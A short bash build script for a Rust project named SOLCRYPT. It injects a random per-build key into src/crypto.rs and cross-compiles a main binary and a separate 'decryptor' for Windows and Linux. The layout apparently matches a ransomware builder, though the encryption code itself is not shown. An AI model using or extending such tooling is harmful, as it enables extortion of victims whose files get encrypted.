#! /bin/bash
echo "SOLCRYPT v. 001"
echo "Build Script v. 001"
echo "[!] Preparing..."
cp src/crypto.rs src/crypto.rs.bak
echo "[i] Replacing key with random data."
export KEY="$(tr -dc A-Za-z0-9 </dev/urandom | head -c 32)"
sed -i -e "s/keyhereshouldbereplacedbybuilder/$KEY/g" src/crypto.rs
echo "[!] Source ready."
PS3='Please select option:'
options=("Windows" "Linux" "Both" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Windows")
            cargo build --bin solcrypt_main --target x86_64-pc-windows-gnu
            cargo build --bin decryptor --target x86_64-pc-windows-gnu
            ;;
        "Linux")
            cargo build --bin solcrypt_main --target x86_64-unknown-linux-gnu
            cargo build --bin decryptor --target x86_64-unknown-linux-gnu
            ;;
        "Both")
            cargo build --bin solcrypt_main --target x86_64-pc-windows-gnu
            cargo build --bin decryptor --target x86_64-pc-windows-gnu
            cargo build --bin solcrypt_main --target x86_64-unknown-linux-gnu
            cargo build --bin decryptor --target x86_64-unknown-linux-gnu
            ;;
        "Quit")
            mv src/crypto.rs.bak src/crypto.rs
            break
            ;;
        *) echo "invalid option $REPLY";;
    esac
done
